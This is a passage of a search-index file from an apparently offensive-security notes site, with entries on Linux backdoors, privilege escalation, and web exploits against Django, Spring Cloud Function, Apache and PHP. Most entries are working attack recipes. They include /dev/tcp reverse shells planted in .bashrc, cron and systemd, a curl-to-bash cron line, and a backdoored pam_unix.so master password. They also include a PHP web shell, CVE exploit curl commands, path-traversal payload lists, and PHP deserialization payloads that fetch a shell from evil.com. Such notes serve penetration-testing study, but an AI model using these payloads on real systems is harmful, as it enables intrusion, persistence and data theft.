                content: "Read EVTX in Linux linkWe can parse .evtx file in Linux using evtx_dump.\nwget https://github.com/omerbenamram/evtx/releases/download/v0.8.1/evtx_dump-v0.8.1-x86_64-unknown-linux-gnu -O evtx_dump chmod +x evtx_dump ./evtx_dump example.evtx \u003e parsed.txt Now we can find sensitive information from the parsed text.\ngrep -i TargetUserName parsed.txt grep -i TargetDomainName parsed.txt Search Suspicious Activity in EVTX linkChainsaw is a command-line tool to rapidly search and hunt through Windows Forensics Artifacts.\ngit clone https://github.com/WithSecureLabs/chainsaw.git cd chainsaw cargo build --release ./chainsaw hunt evtx_files/ -s sigma/rules --mapping mapping/sigma-event-logs-all.yml "
            }
        );
    index.add(
            {
                id:  203 ,
                href: "\/docs\/hdks\/web\/framework\/python\/django-pentesting\/",
                title: "Django Pentesting",
                description: "Django is a web framework in Python.",
                content: "SSTI (Server-Side Template Injection) link # XSS {{ `` }} # Debug information {% debug %} Bypass ALLOWED_HOSTS linkIf we get the error Invalid HTTP_HOST header: x.x.x.x:8000. You may need to add x.x.x.x to ALLOWED_HOSTS\" when accessing the website written in Django, you need to intercept the value of the Host in the HTTP request header.\nThen you should be able to access the website.\nHost: 0.0.0.0:8000 # or Host: 127.0.0.1:8000 Or if we can have the permission to edit the configuration of the website, add new IP address to ALLOWED_HOSTS in settings.py.\nALLOWED_HOSTS = ['0.0.0.0', '127.0.0.1', 'x.x.x.x'] Create a New User link python3 manage.py createsuperuser "
            }
        );
    index.add(
            {
                id:  204 ,
                href: "\/docs\/hdks\/linux\/post-exploitation\/linux-backdoors\/",
                title: "Linux Backdoors",
                description: "After compromising a target machine, the adversary attempts to establish persistent access. This page lists some methods of backdoors in Linux for persistence.",
                content: ".bashrc linkAdd this line to /root/.bashrc or /home//.bashrc to gain access to target machine by reverse shell when the victim user logged in.\nbash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 Of course we need to always open netcat listener to be able to fetch incoming connection from the target.\nnc -lvnp 4444 Cron linkAdd this line to the cron file like /etc/crontab in the target machine.\n* * * * * root curl http://:/shell | bash Create the shell file in local machine.\nReplace with your ip address.\n#!/bin/bash bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261 Now start local web server in local machine. Note that your current working direcotry need to be where the shell is located.\npython3 -m http.server 4444 Once the cron job downloads the shell file, run bash command to execute the shell.\nWe should gain access to the target shell.\npam_unix.so linkThe pam_unix.so module is likely located in /usr/lib/security or /usr/lib/x86_64-linux-gnu/security directory. It automatically detects and uses shadow passwords to authenticate users.\nSee this line in the pam_unix.so.\n... /* verify the password of this user */ retval = _unix_verify_password(pamh, name, p, ctrl); name = p = NULL; ... Modify this line to as below.\n... /* verify the password of this user */ if (strcmp(p, \"hackyou123\") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; } name = p = NULL; AUTH_RETURN; ... Whenever you login to the target system using the password hackyou123, you can successfully login.\nPHP link1. Create a Payload linkCreate a php file (e.g. shell.php) into /var/www/html.\n\u003c?php if (isset($_REQUEST['cmd'])) { echo \"\" . shell_exec($_REQUEST['cmd']) . \"\"; } ?\u003e Leave the php file in /var/www/html.\n2. Reverse Shell linkAfter that, start a listener for receiving the outcomming connection.\nnc -lvnp 4444 Now access to the web page as below.\nReplace with your ip address.\nhttp:///shell.php?cmd=bach -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261 We should get a shell.\nSSH linkWe can establish a backdoor to allow us to be able to connect the target SSH server anytime by leaving our public key in the target machine.\n1. Generate a New SSH key linkFirst off, run the following command to generate SSH key.\nssh-keygen It will generate two keys, private key (id_rsa) and public key (id_rsa.pub).\n2. Transfer Our SSH Public Key to Target System linkIf there is no .ssh directory in target, we need to create it.\nmkdir .ssh Then put our public key (id_rsa.pub) into /root/.ssh or /home//.ssh in the target machine.\nscp command can be used for transfering it. Replace and depending on your target.\nscp ./id_rsa.pub @:/root/.ssh/ # or scp ./id_rsa.pub @:/home//.ssh/ 3. Add the Public Key Content to authorized_keys linkAlso we need to add the content of our id_rsa.pub to the target authorized_keys file.\ncat id_rsa.pub \u003e\u003e authorized_keys 4. Change Permission of SSH linkIn target machine, we need to set the right permissions of the file/directory. Otherwise we cannot connect SSH. Replace with your target.\nchmod 700 /root chmod 700 /root/.ssh chmod 600 /root/.ssh/authorized_keys # or chmod 700 /home/ chmod 700 /home//.ssh chmod 600 /home//.ssh/authorized_keys 5. Connect to SSH Anytime linkAfter that, we can connect to the target SSH when we want to connect it as long as the public key in .ssh directory is not removed. Before connecting, we need to modify the permission of our private key in local.\nchmod 600 private_key Now we can connect to SSH of the target.\nssh root@ -i private_key # or ssh @ -i private_key Systemd linkWe can use systemd as a backdoor because an arbitrary command will be executed when a service start.\nThe command is stored in [Services] section in the configuration file.\n1. Create a New Systemd Config File linkCreate /etc/systemd/system/backdoor.service in target machine.\nThis service will execute reverse shell when starting.\nReplace with your ip address.\n[UNIT] Description=Backdoor [Service] Type=simple ExecStart=/bin/bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261 [Install] WantedBy=multi-user.target Then enable the service.\nsystemctl enable backdoor Now this service will start when the target system boots.\n2. Wait for Reverse Connecting linkWe need to leave the netcat listener running in local machine.\nnc -lvnp 4444 Then well get a shell anytime the service starts.\n"
            }
        );
    index.add(
            {
                id:  205 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/bash-eq-privilege-escalation\/",
                title: "Bash eq Privilege Escalation",
                description: "The `-eq` comaparison in bash script is vulnerable to arbitrary command execution.",
                content: "Investigation linkPlease see this post for details.\nsudo -l (root) /bin/bash /opt/example.sh If we can execute above command as root, and the /opt/example.sh contains the numeric comparison such as [[ $var -eq 42 ]], we can execute arbitrary command.\n#!/bin/bash read -rp \"Enter guess: \" num if [[ $num -eq 42 ]] then echo \"Correct\" else echo \"Wrong\" fi To execute arbitrary command, answer this question as below.\nsudo /bin/bash /opt/example.sh Enter guess: a[$(date \u003e\u00262)]+42 Sun Feb 4 19:06:19 PST 2018 Correct inject arbitrary command before the correct number (42).\nExploitation (Get a Shell Directly) linkIts easy if we can execute the bash script as root.\nWe only need to insert /bin/sh or /bin/bash command in the answer.\nsudo /bin/bash /opt/example.sh Enter guess: a[$(/bin/sh \u003e\u00262)]+42 $ Exploitation (Get a Shell Indirectly) linkWe can also inject a bash script and execute arbitrary code.\nFirst, create a reverse shell script /tmp/shell.elf using msfvenom.\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell.elf chmod +x /tmp/shell.elf Then start a listener in local machine.\nnc -lvnp 4444 Now execute the bash script as root.\nsudo /bin/bash /opt/example.sh Enter guess: a[$(/tmp/shell.elf)]+42 We should get a root shell in local terminal.\n"
            }
        );
    index.add(
            {
                id:  206 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/ansible-playbook-privilege-escalation\/",
                title: "Ansible Playbook Privilege Escalation",
                description: "Ansible Playbooks are lists of tasks that automatically execute against hosts.",
                content: "PrivEsc with Tasks linkFirst off, check the content of playbook in /opt/ansible/playbooks.\nFor instance, a file named httpd.yaml.\n- name: Install and configure Apache ... roles: - role: geerlingguy.apache tasks: - name: configure firewall firewalld: ... Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks.\nAnd add the exploitable file in this.\nFor example, a file named shell.yml.\n- hosts: localhost tasks: - name: RShell command: sudo bash /tmp/root.sh Create a exploit for reverse shell.\necho '/bin/bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261' \u003e /tmp/root.sh Then open a listener in local machine.\nnc -lvnp At the end, execute ansible\nansible # or ansible-playbook # or sudo -u ansible PrivEsc with Automation Task linkIf the target system runs automation tasks with Ansible Playbook as root and we have write permission of task files (tasks/), we can inject arbitrary commands in yaml file.\nFor example, create a new file /opt/ansible/tasks/evil.yaml.\n- hosts: localhost tasks: - name: Evil ansible.builtin.shell: | chmod +s /bin/bash become: true After a while, we can escalate the root privilege by executing the following command.\n/bin/bash -p "
            }
        );
    index.add(
            {
                id:  207 ,
                href: "\/docs\/hdks\/web\/framework\/java\/spring-cloud-function-rce\/",
                title: "Spring Cloud Function RCE",
                description: "Spring Cloud Function is vulnerable to RCE (CVE-2022-22963)",
                content: "Exploitation linkReverse Shell linkFirst create a reverse shell script in local machine.\n#!/bin/bash bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261 Then start a web server for uploading it.\npython3 -m http.server Now remote code execution with target website as below.\ncurl -X POST https://example.com:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"wget http://10.0.0.1/shell -O /tmp/shell\")' --data-raw 'data' -v Our reverse shell script is uploaded.\nStart a listener in local machine.\nnc -lvnp 4444 Remote code execution again to reverse shell.\n# As needed curl -X POST https://example.com:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"chmod +x /tmp/shell\")' --data-raw 'data' -v curl -X POST https://example.com:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/shell\")' --data-raw 'data' -v We should get a shell.\n"
            }
        );
    index.add(
            {
                id:  208 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/chrome-remote-debugger-pentesting\/",
                title: "Chrome Remote Debugger Pentesting",
                description: "Chrome Remote Debugger is a tool that debugs web applications.",
                content: "Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.\nExploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.\nssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.\nOpen Chrome browser and input the following string in URL bar at the top of the window.\nchrome://inspect/#devices Then click Configure at the right of Discover network targets. The modal window opens.\nIn the modal window, enter localhost:12345 then click Done.\nNow we should see the remote host appears at the bottom of the Remote Target.\nClick inspect then new browser open. We can browse the website.\n"
            }
        );
    index.add(
            {
                id:  209 ,
                href: "\/docs\/hdks\/web\/security-risk\/directory-traversal\/",
                title: "Directory (Path) Traversal",
                description: "Directory traversal attack exploits an application to gain unauthorized access to the file system.",
                content: " /?file=index.php /?file=index.html /?file=/etc/passwd /?file=../../../etc/passwd /?file=../../../../etc/passwd /?file=../../../../../etc/passwd /?file=..//..//..//..//etc/passwd /?file=....//....//....//etc/passwd /?file=....//....//....//....//etc/passwd # URL encode /?file=..%252f..%252f..%252fetc/passwd /?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd # URL double encode /?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd /?file=/var/www/images/../../../etc/passwd /?file=/etc/passwd%00.png /?file=../../../etc/passwd%00.png /?file=....//....//....//etc/passwd%00.png /?file=..%252f..%252f..%252fetc/passwd%00.png /?file=/var/www/images/../../../etc/passwd%00.png # Hostfile /?file=/etc/hosts # SSH keys /?file=../../../../../home//.ssh/authorized_keys /?file=../../../../../home//.ssh/id_rsa # Web root in the developer's home /?file=../../../../home//app/app.py # PHP web application /index.php/../ /index.php/..;/ /index.php/%2e%2e;/ # Windows /?file=..\\..\\..\\windows\\win.ini Apache 2.4.49 (CVE-2021-41773) link # without CGI enabled curl -v 'https://example.com/cgi-bin/../../../../../../../../../../etc/passwd' curl -v 'https://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' curl -v 'https://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' # with CGI enabled curl -v 'http://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H \"Content-Type: text/plain\" Apache 2.4.50 (CVE-2021-42013) link # without CGI enabled curl -v 'https://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd' # with CGI enabled curl -v 'https://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H \"Content-Type: text/plain\" "
            }
        );
    index.add(
            {
                id:  210 ,
                href: "\/docs\/hdks\/windows\/service\/microsoft-outlook-message\/",
                title: "Microsoft Outlook Message (.msg)",
                description: "The .msg file is used to represent individual email messages, appointments, contacts, tasks, and so on in the file system.",
                content: "Decrypt \u0026 Open in Linux link sudo apt-get install libemail-outlook-message-perl libemail-sender-perl msgcovert example.msg open example.eml Extract Attached Files linkIf the message is attached some file e.g. .zip, we can extract the file.\n1. In CyberChef, paste the text contains Base64 encoded. linkFor example,\nContent-ID: Content-Type: application/octet-stream; name=example.zip Content-Disposition: attachment; filename=example.zip Content-Transfer-Encoding: base64 UEsDBBQAAAAIAJBsAVWzNSwXM3oTAAAQ8QANAAAAc2VjdXJpdHkuZXZ0eOxdCXxVxdU/b8nLRhZk R5aAoqINJISwChISAlSQCEHFUjCQxABJwCTsLnHBtSpabW2t1rpVu1g/97pVa22prRqXKrW0ta1t ... 6Vf33X5WvnNm5rx7373vvnffct97I== 2. Attach Base64 and Extract Files operations. linkAfter baking, we should get the attached file and download it.\n"
            }
        );
    index.add(
            {
                id:  211 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/openssl-privilege-escalation\/",
                title: "OpenSSL Privilege Escalation",
                description: "Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/ 1. Get Capabilities linkChack capabilities in the target machine. # -r: recursive getcap -r / 2\u003e/dev/null If you see the openssl has the capability set as below, you can successfully exploit it. /usr/bin/openssl = cap_setuid+ep 2. Create the Exploit in C linkIn local machine, you need to have libssl-dev to use the header file named openssl/engine.h in the exploit. If you dont have it yet, install it.",
                content: "Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/\n1. Get Capabilities linkChack capabilities in the target machine.\n# -r: recursive getcap -r / 2\u003e/dev/null If you see the openssl has the capability set as below, you can successfully exploit it.\n/usr/bin/openssl = cap_setuid+ep 2. Create the Exploit in C linkIn local machine, you need to have libssl-dev to use the header file named openssl/engine.h in the exploit.\nIf you dont have it yet, install it.\nsudo apt install libssl-dev Then create exploit.c.\n#include static int bind(ENGINE *e, const char *id) { setuid(0); setgid(0); system(\"/bin/bash\"); } IMPLEMENT_DYNAMIC_BIND_FN(bind) IMPLEMENT_DYNAMIC_CHECK_FN() Now compile it using gcc.\n# -fPIC: for generating a shared object (PIC: Position Independent Code) # -c: compile and assemble, but do not link. gcc -fPIC -o exploit.o -c exploit.c # -shared: create a shared library. gcc -shared -o exploit.so -lcrypto exploit.o 3. Get the Root Shell linkTransfer the exploit.so to the target machine.\nwget http://:8000/exploit.so Run the exploit and finally you should get the root shell.\n# req: PKCS#10 X.509 Certificate Signing Request (CSR) Management. # engine: Engine (loadable module) information and manipulation. openssl req -engine ./exploit.so Command Injection in Subject link openssl x509 -in /opt/example.crt -noout -subject If the above command is executed by root and use values of subjects in any way, we might be able to execute arbitrary command as root.\nExploitation linkFor example, create a certificate that contains the malicious subject value.\nWhen the prompt asks us to enter values, we can insert arbitrary command.\nopenssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /opt/example.key -out /opt/example.crt -days 1 ... Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash) ... Then some shell script, that uses the subject values, is executed as root, our command ($(chmod u+s /bin/bash)) may be executed as root.\n"
            }
        );
    index.add(
            {
                id:  212 ,
                href: "\/docs\/hdks\/web\/security-risk\/php-object-injection\/",
                title: "PHP Object Injection",
                description: "PHP Object Injection is a type of vulnerability that can occur when untrusted user input is deserialized in a PHP application.",
                content: "Investigation linkBelow is an example of an index.php in PHP web application.\n\u003c?php class Example { public $file = 'example.txt'; public $msg = 'Hello World'; public function SomeFunc() { // Some code ... } public function __destruct() { file_put_contents(__DIR__ . '/' . $this-\u003efile,$this-\u003emsg,FILE_APPEND); } } $data = unserialize($_GET['data']); // Some code ... ?\u003e This code adds a text file named example.txt, that contains Hello World strings, into the web root directory. If the data parameter (/?data=...) is given, this value will be unserialized by unserialize() method.\nIn short, we can inject the serialized malicious code to the value of the data parameter.\nThen access to https://example.com/?data= then our arbitrary code will be executed.\nFor example,\nhttp://example.com/?data=O:8:\"Example\":1:{s:10:\"msg\";s:15:\"\u003c?php system('wget http://evil.com:8000/shell.php -O shell.php'); ?\u003e\";} Exploitation 1 linkAssumes the above situation (index.php in the Investigation section).\nWe generate the serialized data and inject it to the data parameter.\n1. Generate a Serialized Malicious Object linkCreate a malicious Example class contains __destruct() method in PHP.\nThis script add the download.php, which downloads a PHP reverse shell script, into the web root directory. Then prints the URL encoded serialized Example class.\nReplace with your local ip address.\n\u003c?php class Example { public $file = 'download.php'; public $msg = \"\u003c?php system('wget http://:8000/shell.php -O shell.php'); ?\u003e\"; public function SomeFunc() { // Some code ... } public function __destruct() { file_put_contents(__DIR__ . '/' . $this-\u003efile,$this-\u003emsg,FILE_APPEND); } } print urlencode(serialize(new Example)); ?\u003e Then generate a deserialized data.\nphp generate.php Copy the output data.\n2. Download a Reverse Shell Script. linkIn local machine, start local web server where the PHP reverse shell script located.\npython3 -m http.server 80000 Now access to https://example.com/?data=.\nhttp://example.com/?data=O:8:\"Example\":1:{s:10:\"msg\";s:15:\"\u003c?php system('wget http://evil.com:8000/shell.php -O shell.php'); ?\u003e\";} By this, our PHP reverse shell script is download to the target web root (e.g. https://example.com/shell.php).\nExploitation 2 linkFirst off, prepare the reverse shell script (shell.php) in local machine and start web server.\nThen create a maliciou payload as follow.\n\u003c?php class Example { public $tmp = \"http://evil.com/shell.php\"; public $imgPath = \"./shell.php\"; public function __wakeup() { $f = fopen($this-\u003eimgPath, \"w\"); fwrite($f, file_get_contents($tmp)); fclose($f); } } $payload = base64_encode(serialize(new Example)); echo $payload; ?\u003e Now run it in terminal.\nphp payload.php Copy the output and paste it to where the payload affects.\nAutomation linkPHPGGC is a library of PHP unserialize() payloads along with a tool to generate them.\n# List all gadeget chains phpggc -l "
            }
        );
    index.add(
            {
                id:  213 ,
                href: "\/docs\/hdks\/web\/php-srand-time-abusing\/",
                title: "PHP Srand Time Abusing",
                description: "If the website uses srand(time()) to generate random strings in PHP, we can get the non-random strings by manipulating the attribute of the srand() function.",
                content: "Investigation link function generate_random_number() { srand(time()); // Some code for generating random number... return random_numbers; } For example, assume website uses the above function that generates random numbers or strings to be used for authentications such as activation code, multi-factor security code.\nIn such cases, we can replace the time() function with the strtotime() to make the result to be non-random.\nExploitation link1. Send Request linkFirst off, send the request for executing the desired function e.g. generate_random_number that uses srand(time()).\nSee the HTTP response header.\nDate: Thu, 09 Mar 2023 08:31:35 GMT We can get the time such as 08:31:35 so copy this.\n2. Generate Non-Random Result linkWe can insert the above Date time as the attribute of strtotime() function as follow.\nfunction generate_random_number() { srand(strtotime(\"08:31:35\")); // Some code for generating random number... echo random_numbers; } Now execute the above function in PHP playground.\nWe can get the same result no matter how many times we run it.\n"
            }
        );
    index.add(
            {
                id:  214 ,
                href: "\/docs\/hdks\/web\/security-risk\/json-net-deserialization\/",
                title: "JSON.NET Deserialization",
                description: "In .NET application that uses JSON.net (Newtonsoft library), we can inject arbitrary code or read local files by abusing JSON deserialization objects.",
                content: "Investigation linkWe can decompile .dll files using ILSpy in Windows. If you like to use ILSpy in Linux, use AvaloniaILSpy.\njson = JsonConvert.DeserializeObject(json); If the application uses JsonConvert.DeserializeObject function, we can abuse JSON object and execute arbitrary code or read local files.\nExploitation linkWe can give the Json value to the JsonConvert.DeserializeObject(json) with a reserved key ($type).\nThe format is as follow. The value of $type is a string that contains the assembly-qualified name of the .NET type to be deserialized.\n{ \"$type\": \"., \", \"\": \"\" } LFI linkIf the application has the method that reads file, we can use this method and read desired files by abusing JSON oject to deserialize. For example, the application has ReadFile method in the File class so we can use it to read local files.\n{ \"$type\": \"Example.File, example\", \"ReadFile\": \"../../../../etc/passwd\" } Deserialization Payload Generator linkFor .NET, we can use Ysoserial.net but Windows machine required.\n"
            }
        );
    index.add(
            {
                id:  215 ,
                href: "\/docs\/hdks\/web\/websocket-pentesting\/",
                title: "WebSocket Pentesting",
                description: "WebSocket is a protocol that provides full-duplex communication channels over a single single TCP connection.",
                content: "Connect with CLI linkwebsocat is a command-line client for WebSockets, like netcat for\nwebsocat ws:/// Connect with Python Script link import websocket,json ws = websocket.WebSocket() ws.connect(\"ws://10.0.0.1/\") d = {\"message\": \"hello\"} data = str(json.dumps(d)) ws.send(data) result = ws.recv() print(json.loads(result)) As above, we can manipulate the data to send. For example,\n{\"message\": \"\"} If the website reflects the result of the above interactions, we can affect the website.\nBlind SQL Injection linkFirst, create a Python script to establish a middleware server to forward sqlmap payloads to the target WebSocket server.\nThe script name is server.py here. Also we need to install websocket-client Python package.\nfrom http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection ws_server = \"ws:///\" def send_ws(payload): ws = create_connection(ws_server) message = unquote(payload).replace('\"', '\\'') data = '{\"id\":\"%s\"}' % message ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return '' def middleware_server(host_port, content_type=\"text/plain\"): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -\u003e None: self.send_response(200) try: payload = urlparse(self.path).query.split('=',1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = 'No parameters specified!' self.send_header(\"Content-Type\", content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() print(\"[+] Starting Middleware Server\") print(\"[+] Send payloads in http://localhost:8081/?id=*\") try: middleware_server(('0.0.0.0', 8081)) except KeyboardInterrupt: pass Then start middleware server by running the above script.\npython3 server.py Finally execute sqlmap.\nsqlmap -u \"http://localhost:8081/?id=*\" --batch --dbs sqlmap -u \"http://localhost:8081/?id=*\" --batch --dbs --risk 3 --level 5 For details, see this awesome post.\nCross-Site WebSocket Hijacking link Send messages in the target web page like chat room using WebSocket.\nCheck the WebSocket handshake connection in the request as below. It contains the Connection: Upgrade, Upgrade: websocket, Sec-WebSocket-Key, etc. in the request header.\nGET /chat HTTP/1.1 Host: vulnerable.com Connection: Upgrade Upgrade: websocket Sec-WebSocket-Version: 13 Cookie: session=wUTqcDb41l4jbfPUt0XKl36FNh36aSrBl Sec-WebSocket-Key: NZxnyRVz0Z9yGnOyqAWl4Q== If there is no CSRF token in the request, we can CSRF on WebSocket.\nIn our WebSocket server, create the script.\nIn our attack website, copy files of the target and paste to our web directory to impersonate the target website.\nStart web server using Python.\nsudo python3 -m http.server 80 "
            }
        );
    index.add(
            {
                id:  216 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/apache-conf-privilege-escalation\/",
                title: "Apache Conf Privilege Escalation",
                description: "Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.\nExploitation link1. Update Apache.Conf linkFirst modify apache.conf file to change the web user with new one.\n# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.",
                content: "Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.\nExploitation link1. Update Apache.Conf linkFirst modify apache.conf file to change the web user with new one.\n# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.\nAssume the website uses PHP, so we can create shell.php in the web root and insert PHP reverse shell script.\n3. Restart Apache Server link4. Get a Shell linkWe need to start a listener in local terminal.\nnc -lvnp 1234 Then access to the web page e.g. https://example.com/shell.php.\nWe should get a shell as the desired user.\n"
            }
        );
    index.add(
            {
                id:  217 ,
                href: "\/docs\/hdks\/web\/method\/http-rate-limit-bypass\/",
                title: "HTTP Rate Limit Bypass",
                description: "The 429 Too Many Requests response in HTTP header occurs when the client has sent too many requests in a given amount of time (rate limiting). That is because the server limits the number of requests. However, we may be able to bypass this restriction.",
                content: "Bypass linkWe may be able to bypass the rate limiting by adding one of the following headers and change the IP per request.\nSometimes, we need to add multiple headers.\nX-Forwarded: X-Forwarded-For: X-Forwarded-Host: X-Client-IP: X-Remote-IP: X-Remote-Addr: X-Host: X-Originating-IP: "
            }
        );
    index.add(
            {
                id:  218 ,
                href: "\/docs\/hdks\/web\/cms\/mara-cms-pentesting\/",
                title: "Mara CMS Pentesting",
                description: "Mara CMS is a file based content management system.",
                content: "Default Credentials link admin:changeme Remote Code Execution (RCE) v7.5 linkReference: https://www.exploit-db.com/exploits/48780\nAutomation link msfconsole msf\u003e use exploit/multi/http/maracms_upload_exec msf\u003e set rhosts msf\u003e set lhost msf\u003e set srvhost msf\u003e set srvport msf\u003e set targeturi /path/to/maracms/ msf\u003e set targeturipath /path/to/maracms/ "
            }
        );
    index.add(
            {
                id:  219 ,
                href: "\/docs\/hdks\/windows\/powershell\/powershell\/",
                title: "PowerShell",
                description: "Powershell is a task automation and configuration management program from Microsoft. Powershell uses the Unicode UTF-16LE encoding by default.",
                content: "Start PowerShell linkOn Linux link pwsh # Execute PS commands without entering shell. pwsh -Command On Windows link powershell # Bypass ExecutionPolicy powershell -ep bypass # check for the result PS\u003e Get-ExecutionPolicy Commands linkOS Information link $PSVersionInfo Change Directory linkcd in Linux.\nSet-Location -Path c:\\Users\\Administrator\\Desktop List Files linkls in Linux.\nGet-ChildItem -File -Hidden Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Get-ChildItem -Directory -Hidden Get-ChildItem -Directory -Hidden -Recurse -Filter '*secret*' -ErrorAction SilentlyContinue Get-ChildItem -Path .\\Desktop Get-ChildItem -Recurse View the Content of Files linkcat in Linux.\nGet-Content -Path example.txt # 'cat | wc -l' in Linux Get-Content -Path example.txt | Measure-Object -Word # (Get-Content -Path example.txt)[318] Find Files linkfind in Linux.\nGet-ChildItem -Path c:\\\\ -Filter \"*.txt\" -Recurse 2\u003e$null Set Content to a File linkecho hello \u003e example.txt in Linux.\nSet-Content -Path .\\example.txt -Value hello Download Web Content linkwget in Linux.\nInvoke-WebRequest -Uri http://10.0.0.1:8000/example.exe -OutFile .\\example.exe Copy Files linkcp in Linux.\ncopy c:\\Tools\\example.exe \\Users\\michael\\Documents\\ Cryptography link # md5sum in Linux Get-FileHash -Algorithm MD5 example.exe CertUtil -hashfile example.exe MD5 # sha256sum in Linux Get-FileHash -Algorithm SHA256 example.exe CertUtil -hashfile example.exe SHA256 # sha512sum in Linux Get-FileHash -Algorithm SHA512 example.exe CertUtil -hashfile example.exe SHA512 XML Credential linkWe can decrypt a password stored in an xml file.\n# Decrypt a password in xml. $Credential = Import-Clixml -Path .\\example.xml $Credential.GetNetworkCredential().password Print Text Strings linkstrings in Linux.\n.\\Strings.exe -accepteula example.exe Add New User linkuseradd in Linux.\nNew-LocalUser -Name \"username\" -Description \"My first account\" -NoPassword # with password $Password = Read-Host -AsSecureString New-LocalUser -Name \"username\" -Password $Password -FullName \"New User\" -Description \"My first account\" Show the Manual of Command linkman or help in Linux.\nGet-Help Get-ChildItem Get-Help Invoke-WebRequest Create New File linktouch in Linux.\nNew-Item example.txt $null \u003e example.txt Create New Folder linkmkdir in Linux\nmkdir example_folder Remove Files linkrm in Linux\nrm exxample.txt rm -r example_folder Reboot Computer linkreboot in Linux\nRestart-Computer NTFS (New Technology File System) ADS (Alternate Data Steams) linkNTFS ADS allows the malware creator to hide data in an endpoint.\nGet-Item -Path file.exe -Stream * To launch the hidden executable hiding with ADS, run the following command.\nwmic process call create $(Resolve-Path example.exe:streamname) Active Directory link # List all domain objects in AD Get-DomainObject -Identity \"dc=example,dc=com\" -Domain example.com # List all domain controllers in AD Get-DomainController # List all computers in the newtork Get-NetComputer | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity # Get the machine which participates the Active Directory Get-ADComputer -properties dnshostname,serviceprincipalname # Remove the current SPN attribute Set-ADComputer -ServicePrincipalName @{} # Set new DNS hostname to that of the DC Set-ADComputer -DnsHostName VULNDC.vuln.local "
            }
        );
    index.add(
            {
                id:  220 ,
                href: "\/docs\/hdks\/web\/codiad-pentesting\/",
                title: "Codiad Pentesting",
                description: "Codiad is a web-based IDE framework.",
                content: "Default Credentials link # Docker image - https://hub.docker.com/r/bitnami/codiad user:bitnami Enumeration link # Get current directory in the system /components/project/controller.php?action=get_current Remote Code Execution (RCE) v2.8.4 link wget https://www.exploit-db.com/exploits/49705 -O exploit.py # Linux python3 exploit.py https://example.com/ admin admin 4444 linux # Windows python3 exploit.py https://example.com/ admin admin 4444 windows "
            }
        );
    index.add(
            {
                id:  221 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-tee-privilege-escalation\/",
                title: "Sudo Tee Privilege Escalation",
                description: "Sudo tee command is vulnerable to privilege escalation.",
